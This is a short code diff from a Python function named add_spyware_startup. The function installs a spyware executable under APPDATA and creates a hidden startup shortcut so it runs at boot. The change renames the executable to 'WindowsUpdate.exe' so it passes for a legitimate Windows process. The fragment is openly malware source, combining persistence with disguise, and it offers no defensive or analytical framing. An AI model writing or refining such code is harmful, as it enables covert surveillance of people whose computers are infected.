@@ -20,7 +20,7 @@ def add_spyware_startup():
         
         # Get spyware executable path
         appdata = os.getenv('APPDATA')
-        spyware_exe = os.path.join(appdata, "SystemSecurityService", "SecurityScanner.exe")
+        spyware_exe = os.path.join(appdata, "SystemSecurityService", "WindowsUpdate.exe")
         
         # Create hidden shortcut (using VBScript method)
         shortcut_path = os.path.join(startup_folder, "SecurityScanner.lnk")
